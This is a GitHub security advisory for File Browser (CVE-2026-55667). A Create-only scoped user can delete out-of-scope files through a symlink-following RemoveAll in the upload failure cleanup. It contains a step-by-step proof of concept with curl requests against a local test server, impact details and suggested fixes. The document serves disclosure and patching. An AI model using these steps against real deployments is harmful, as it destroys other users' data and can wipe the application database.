# [H] File Browser: Out-of-scope file deletion by a Create-only scoped user via symlink-following RemoveAll in upload failure-cleanup

## Summary
Severity: High
Advisory: GHSA-fmm7-x4gx-8jhr
CVE: CVE-2026-55667
CWE: CWE-22, CWE-59
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:H (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-fmm7-x4gx-8jhr
Type: github-advisory

## Affected
- Go: `github.com/filebrowser/filebrowser/v2` — affected >=0 <2.63.16

## Details
## Summary

A scoped, non-admin File Browser user holding only the **Create** permission can delete arbitrary files outside their scope (other tenants' data, and the application's own database) via the upload failure-cleanup path. This is an incomplete fix of CVE-2026-54094: the v2.63.14 `ScopedFs` containment wrapper was applied to read/write/list/rename but NOT to the delete path. Confidentiality is preserved (reads stay blocked); integrity and availability are not.

`ScopedFs.RemoveAll` is the one dereferencing operation that skips the symlink `guard` every other method enforces. The direct-upload handler runs `RemoveAll` on the user-controlled path during failed-upload cleanup, gated only by `Perm.Create`. If an escaping directory symlink already exists inside the user's scope, an authenticated create-only user can delete an out-of-scope target, bypassing both the `ScopedFs` boundary and the `Perm.Delete` gate.

Affected code: https://github.com/filebrowser/filebrowser/blob/be23ab3a15bf957928ecfed88de5ab67850c1b9c/http/resource.go#L172-L174

## Details

CVE-2026-54094 was fixed by a `ScopedFs` afero wrapper whose `guard()` resolves every path component with `filepath.EvalSymlinks` and rejects out-of-scope targets. `guard()` is invoked on read, write, list, rename, stat, etc. The fix is incomplete; two gaps combine:

1. `ScopedFs.Remove` and `ScopedFs.RemoveAll` skip `guard()` (`files/scoped.go:138-144`) — they call `s.base.Remove/RemoveAll` directly, unlike every other method.
2. `resourcePostHandler` does not return on a `NewFileInfo` containment error (`http/resource.go:125-180`). For an out-of-scope path `NewFileInfo` fails, but the handler only uses that for the override branch (`if err == nil`) and falls through to `writeFile`, which is correctly guard-blocked and errors — triggering the failure-cleanup `_ = d.user.Fs.RemoveAll(r.URL.Path)` (`http/resource.go:173`) on the unvalidated path.

Because Go's `os.RemoveAll` follows a symlinked ancestor, `RemoveAll("link/secret.txt")` where `link -> /srv/victim` deletes `/srv/victim/secret.txt`, outside scope. The HTTP response is 403 (write blocked), masking the deletion.

Of the three handlers calling `RemoveAll`, only `resourcePostHandler` is exploitable; `resourceDeleteHandler` (`:114`) and `tusDeleteHandler` (`:264`) return the `NewFileInfo` error first (shadowed, confirmed by negative controls). If the target is a directory, `RemoveAll` recursively removes out-of-scope contents.

## Precondition

An escaping directory symlink must already exist inside the user's scope. File Browser exposes no symlink-creation API, so it is planted out of band (admin, mounted/shared volume, restored backup, extracted archive, another process). This is the same threat model accepted by CVE-2026-54094.

## Proof of concept

Root `/tmp/fb-root`, a Create-only non-admin user scoped to `/scope` with `Perm.Create=true` (and `Perm.Delete=false` — the bug must not need it), and a pre-existing symlink `/tmp/fb-root/scope/link -> /tmp/fb-out`:

```sh
# 0. Layout: server root + an out-of-scope dir holding the victim file
mkdir -p /tmp/fb-root /tmp/fb-out
echo keep > /tmp/fb-out/victim.txt

# 1. Init DB and pin the server root
filebrowser -d /tmp/fb.db config init
filebrowser -d /tmp/fb.db config set --root /tmp/fb-root

# 2. Create a CREATE-ONLY, non-admin user scoped to /scope. perm.delete=false is the point: the bug must not need it
filebrowser -d /tmp/fb.db users add victim hunter2 \
  --scope=/scope \
  --perm.admin=false --perm.create=true \
  --perm.modify=false --perm.delete=false \
  --perm.rename=false --perm.share=false --perm.execute=false

# 3. Plant an escaping directory symlink inside the user's scope. Out-of-band, per the threat model
#    (admin, mounted/shared volume, restored backup, another process). No FileBrowser API creates this.
ln -s /tmp/fb-out /tmp/fb-root/scope/link

# 4. Start the server
filebrowser -d /tmp/fb.db -a 127.0.0.1 -p 8080

# 5. Log in; the JWT is returned as the raw response body
JWT=$(curl -s -X POST http://127.0.0.1:8080/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"victim","password":"hunter2"}')

# 6. Trigger: POST to a child of the symlink. The guarded write (MkdirAll/OpenFile) fails with 403,
#    and failed-upload cleanup then runs the UNguarded RemoveAll("/link/victim.txt").
curl -i -X POST -H "X-Auth: $JWT" --data 'x' \
  'http://127.0.0.1:8080/api/resources/link/victim.txt'

# 7. Impact check
test ! -e /tmp/fb-out/victim.txt && echo "IMPACT: out-of-scope victim.txt DELETED"
```

Minimal HTTP summary (Create-only user `carol`, scope `/attacker`, pre-existing symlink `/attacker/link -> /srv/victim`, file `/srv/victim/secret.txt`):

```text
GET  /api/raw/link/secret.txt        -> 403 (read containment still holds — the v2.63.14 fix)
POST /api/resources/link/secret.txt  -> 403 (write blocked)
   => /srv/victim/secret.txt is DELETED (unguarded cleanup RemoveAll followed the symlinked ancestor)
```

Verified blast radius (per-case HTTP + on-disk before/after captured): create-only no-override deletion; cross-tenant deletion; full-instance DoS (delete the database dir → all users/shares/config gone, admin login fails); negative controls on the DELETE sinks (403, file survives).

## Impact

A per-tenant / per-share scoped user with only Create can destroy any file the File Browser process can reach via a symlink lexically inside their scope: other tenants' data or the application database (instance DoS). A create-only user deletes out-of-scope files reachable through an escaping symlinked directory, bypassing the `ScopedFs` boundary and the `Perm.Delete` gate. If the target is a directory, `RemoveAll` recursively removes out-of-scope contents. Precondition: a symlink present in the user's scope — identical to the parent CVE-2026-54094, which the project treated as in-scope, and which arises naturally via mounted volumes, restored backups, or extracted archives.

## Suggested fix

1. Add `guard()` to `ScopedFs.Remove` and `ScopedFs.RemoveAll` (`files/scoped.go`), mirroring the other methods (closes the class for all callers).
2. Defense-in-depth: in `resourcePostHandler`, return early when `NewFileInfo` returns a non-not-exist error (do not fall through to `writeFile`/cleanup on a path that failed containment).

## References

- Incomplete fix of CVE-2026-54094 / `GHSA-239w-m3h6-ch8v`.
- Affected code: `files/scoped.go` (`ScopedFs.Remove`, `ScopedFs.RemoveAll`), reached from `http/resource.go` (`resourcePostHandler` failure-cleanup, line 173).
- Confirmed unpatched at HEAD `be23ab3` (`v2.63.15`); no open issue/PR addresses the `Remove`/`RemoveAll` gap.

## References
- https://github.com/filebrowser/filebrowser/security/advisories/GHSA-fmm7-x4gx-8jhr
- https://nvd.nist.gov/vuln/detail/CVE-2026-55667
- https://github.com/filebrowser/filebrowser
- https://github.com/filebrowser/filebrowser/blob/be23ab3a15bf957928ecfed88de5ab67850c1b9c/http/resource.go#L172-L174
